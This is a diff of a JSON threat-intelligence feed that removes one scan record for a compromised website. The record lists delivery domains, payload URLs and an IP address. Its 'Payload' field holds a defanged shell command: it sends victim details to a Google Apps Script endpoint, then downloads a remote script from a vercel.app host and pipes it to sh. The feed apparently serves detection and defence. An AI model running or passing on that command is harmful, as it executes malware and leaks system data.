@@ -2401,32 +2401,5 @@
     ],
     "ReportId": "cmwv5kxqk0djg0nmlm8i882tp",
     "ScannedAt": "2026-11-24T20:34:31.079000+00:00"
-  },
-  {
-    "UrlDomain": "www.ascent.se",
-    "DeliveryUrl": [
-      "img-codes-cloude.info",
-      "sky.dolcefantasia.us",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fwww.ascent.se"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "46.30.213.93"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=bc759bae-8f26-4220-8046-410284017e55&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]ascent[.]se%2F&os=Linux%20x86_64&lastVisitAt=2026-11-24T19%3A30%3A35.746Z&lastShellAt=2026-11-24T19%3A30%3A35.746Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwv3cmvm0d8p0nml83y5673a",
-    "ScannedAt": "2026-11-24T19:32:04.422000+00:00"
   }
 ]
